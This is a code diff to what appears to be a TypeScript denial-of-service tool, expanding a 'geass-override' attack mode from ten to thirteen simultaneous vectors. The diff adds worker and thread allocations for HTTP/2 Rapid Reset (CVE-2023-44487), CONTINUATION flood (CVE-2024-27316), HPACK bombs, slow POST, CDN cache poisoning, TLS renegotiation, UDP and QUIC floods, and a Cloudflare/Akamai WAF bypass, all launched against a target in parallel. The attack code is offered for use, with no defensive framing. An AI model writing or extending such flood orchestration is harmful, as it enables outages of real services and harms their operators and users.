@@ -177,41 +177,52 @@ async function runAttackWorkers(
     return;
   }
 
-  // ── GEASS OVERRIDE: DECA vector — ABSOLUTE MAXIMUM DEVASTATION ─────────
+  // ── GEASS OVERRIDE: TREDECA VECTOR — ABSOLUTE OMNIVECT DEVASTATION ─────
   // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
   // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
   // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU
   // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM
-  // Vector  5: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
-  // Vector  6: WebSocket Exhaustion    — goroutine/thread per conn, far more expensive than HTTP
-  // Vector  7: GraphQL Introspection   — exponential resolver CPU: O(N^15) complexity
-  // Vector  8: UDP Flood               — raw bandwidth saturation at L4
-  // Vector  9: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
-  // Vector 10: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
+  // Vector  5: HPACK Bomb              — RFC 7541 incremental indexing table eviction storm
+  // Vector  6: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
+  // Vector  7: WebSocket Exhaustion    — goroutine/thread per conn + large message frames
+  // Vector  8: GraphQL Fragment Bomb   — fragment spread explosion: O(frags × fields) CPU
+  // Vector  9: RUDY v2 Slow POST       — multipart/form-data 1GB body, holds server threads
+  // Vector 10: Cache Poison            — CDN cache eviction, 100% origin miss rate
+  // Vector 11: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
+  // Vector 12: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
+  // Vector 13: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
   //
-  // Total workers: 12 — optimized for 8vCPU / 32GB RAM deployment
+  // Total workers: ~18 — optimized for 8vCPU / 32GB RAM deployment
   if (method === "geass-override") {
-    const connW  = 1;
-    const slowW  = 1;
-    const h2W    = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487
-    const contW  = Math.max(1, Math.ceil(CPU_COUNT * 0.15)); // ≥1 — CVE-2024-27316
-    const wafW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // ≥2 — CF/Akamai bypass
-    const wsW    = 1;
-    const gqlW   = 1;
-    const quicW  = 1;  // QUIC/H3 — UDP single worker
-    const sslW   = 1;  // SSL Death Record
+    const connW   = 1;
+    const slowW   = 1;
+    const h2W     = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487
+    const contW   = Math.max(1, Math.ceil(CPU_COUNT * 0.14)); // ≥1 — CVE-2024-27316
+    const hpackW  = Math.max(1, Math.ceil(CPU_COUNT * 0.12)); // ≥1 — HPACK table eviction
+    const wafW    = Math.max(2, Math.ceil(CPU_COUNT * 0.18)); // ≥2 — CF/Akamai bypass
+    const wsW     = 1;
+    const gqlW    = 1;
+    const rudyW   = 1;
+    const cacheW  = 1;
+    const tlsW    = 1;
+    const quicW   = 1;  // QUIC/H3 — UDP single worker
+    const sslW    = 1;  // SSL Death Record
 
-    // Thread budget — 8vCPU/32GB optimized (10-vector split)
-    const connT  = Math.max(50,  Math.round(threads * 0.12));
-    const slowT  = Math.max(40,  Math.round(threads * 0.10));
-    const h2T    = Math.max(120, Math.round(threads * 0.25)); // ★ CVE-2023-44487 dominant
-    const contT  = Math.max(80,  Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM
-    const wafT   = Math.max(100, Math.round(threads * 0.20)); // ★ CF bypass
-    const wsT    = Math.max(60,  Math.round(threads * 0.12)); // WS goroutine hold
-    const gqlT   = Math.max(40,  Math.round(threads * 0.08)); // GraphQL CPU
-    const udpT   = Math.max(32,  Math.round(threads * 0.08)); // L4 bandwidth
-    const quicT  = Math.max(16,  Math.round(threads * 0.06)); // QUIC/H3 DCID exhaust
-    const sslT   = Math.max(50,  Math.round(threads * 0.10)); // SSL Death Record
+    // Thread budget — 8vCPU/32GB optimized (13-vector split)
+    const connT   = Math.max(50,  Math.round(threads * 0.10));
+    const slowT   = Math.max(40,  Math.round(threads * 0.08));
+    const h2T     = Math.max(120, Math.round(threads * 0.25)); // ★ CVE-2023-44487 dominant
+    const contT   = Math.max(80,  Math.round(threads * 0.15)); // ★ CVE-2024-27316 OOM
+    const hpackT  = Math.max(80,  Math.round(threads * 0.12)); // ★ HPACK eviction storm
+    const wafT    = Math.max(100, Math.round(threads * 0.18)); // ★ CF/Akamai bypass
+    const wsT     = Math.max(60,  Math.round(threads * 0.10)); // WS goroutine hold + frames
+    const gqlT    = Math.max(40,  Math.round(threads * 0.08)); // GraphQL fragment CPU
+    const udpT    = Math.max(32,  Math.round(threads * 0.06)); // L4 bandwidth
+    const rudyT   = Math.max(30,  Math.round(threads * 0.06)); // Slow POST thread hold
+    const cacheT  = Math.max(30,  Math.round(threads * 0.06)); // CDN origin miss flood
+    const tlsT    = Math.max(20,  Math.round(threads * 0.05)); // TLS renegotiation
+    const quicT   = Math.max(16,  Math.round(threads * 0.05)); // QUIC/H3 DCID exhaust
+    const sslT    = Math.max(50,  Math.round(threads * 0.08)); // SSL Death Record
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -225,16 +236,20 @@ async function runAttackWorkers(
     };
 
     await Promise.all([
-      spawnPool("conn-flood",         target, port, connT, connW, signal, makeGeassOnStats("conn")),
-      spawnPool("slowloris",          target, port, slowT, slowW, signal, makeGeassOnStats("slow")),
-      spawnPool("http2-flood",        target, port, h2T,   h2W,   signal, onStats),
-      spawnPool("http2-continuation", target, port, contT, contW, signal, onStats),
-      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),
-      spawnPool("ws-flood",           target, port, wsT,   wsW,   signal, makeGeassOnStats("ws")),
-      spawnPool("graphql-dos",        target, port, gqlT,  gqlW,  signal, onStats),
-      spawnPool("udp-flood",          target, port, udpT,  1,     signal, onStats),
-      spawnPool("quic-flood",         target, port, quicT, quicW, signal, onStats),
-      spawnPool("ssl-death",          target, port, sslT,  sslW,  signal, makeGeassOnStats("ssl")),
+      spawnPool("conn-flood",         target, port, connT,  connW,  signal, makeGeassOnStats("conn")),
+      spawnPool("slowloris",          target, port, slowT,  slowW,  signal, makeGeassOnStats("slow")),
+      spawnPool("http2-flood",        target, port, h2T,    h2W,    signal, onStats),
+      spawnPool("http2-continuation", target, port, contT,  contW,  signal, onStats),
+      spawnPool("hpack-bomb",         target, port, hpackT, hpackW, signal, onStats),
+      spawnPool("waf-bypass",         target, port, wafT,   wafW,   signal, onStats),
+      spawnPool("ws-flood",           target, port, wsT,    wsW,    signal, makeGeassOnStats("ws")),
+      spawnPool("graphql-dos",        target, port, gqlT,   gqlW,   signal, onStats),
+      spawnPool("udp-flood",          target, port, udpT,   1,      signal, onStats),
+      spawnPool("rudy-v2",            target, port, rudyT,  rudyW,  signal, makeGeassOnStats("rudy")),
+      spawnPool("cache-poison",       target, port, cacheT, cacheW, signal, onStats),
+      spawnPool("tls-renego",         target, port, tlsT,   tlsW,   signal, makeGeassOnStats("tls")),
+      spawnPool("quic-flood",         target, port, quicT,  quicW,  signal, onStats),
+      spawnPool("ssl-death",          target, port, sslT,   sslW,   signal, makeGeassOnStats("ssl")),
     ]);
     return;
   }
